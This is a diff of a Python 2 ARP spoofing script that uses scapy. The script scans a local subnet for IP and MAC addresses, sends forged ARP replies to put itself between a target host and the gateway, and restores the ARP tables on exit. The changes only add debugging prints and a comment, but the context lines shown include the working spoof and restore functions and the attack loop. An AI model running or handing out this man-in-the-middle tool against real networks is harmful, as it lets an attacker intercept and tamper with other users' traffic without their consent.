@@ -31,7 +31,6 @@ def getmac_all(ip_range):
 	ether_header = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
 	arp_request_packet = ether_header/arp_request_header
 	answered_list = scapy.srp(arp_request_packet,timeout=1,verbose=False)[0]
-	
 	#return  answered_list[0][1].hwsrc
 	clients_list = []
 
@@ -44,6 +43,7 @@ def getmac_all(ip_range):
 
 
 ip_mac = getmac_all("192.168.43.1/24")
+#get all mac and ip address in the ip range and save to a list with {ip,mac} dict format of list
 print ip_mac
 
 def getmac(ip_addr):
@@ -56,7 +56,7 @@ def getmac(ip_addr):
 def spoof(target_ip,spoof_ip):
 
 	dst_mac = getmac(target_ip)
-	
+	print dst_mac,"\t",target_ip,"\n"
 	arp_respond = scapy.ARP(op=2,pdst=target_ip,hwdst=dst_mac,psrc=spoof_ip)
 	scapy.send(arp_respond,verbose=False)
 
@@ -64,11 +64,12 @@ def restore(target_ip,gateway_ip):
 
 	dst_mac=getmac(target_ip)
 	src_mac=getmac(gateway_ip)
+	print dst_mac,"\t",target_ip,"\n"
+	print src_mac,"\t",gateway_ip,"\n"
 	arp_respond = scapy.ARP(op=2,pdst=target_ip,hwdst=dst_mac,psrc=gateway_ip,hwsrc=src_mac)
 	scapy.send(arp_respond,verbose=False,count=4)
 
 count = 0
-
 try:
 	while True:
 
@@ -84,7 +85,6 @@ try:
 except KeyboardInterrupt:
 
 		print "\n[+] Detected CTRL+C Quitting and restoring arp value please wait"
-		
 		restore(target_ip,gateway_ip)
 		#restoring client
 		restore(gateway_ip,target_ip)
